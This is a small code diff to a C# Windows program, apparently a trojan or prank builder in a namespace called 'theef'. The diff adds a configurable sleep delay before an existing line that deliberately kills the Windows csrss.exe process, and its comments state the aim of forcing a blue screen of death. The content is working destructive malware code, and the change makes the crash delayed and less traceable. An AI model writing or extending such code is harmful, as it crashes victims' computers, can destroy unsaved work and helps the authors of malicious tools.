@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace theef
@@ -42,6 +43,9 @@ namespace theef
             // ========== BSOD (blue screen of death) ==========
             if(settings.BsodEnabled == 1)
             {
+                // Sleep for the set ammount of time.
+                Thread.Sleep(settings.BsodDelay);
+
                 // Killing the process csrss.exe causes a bsod.
                 System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
             }
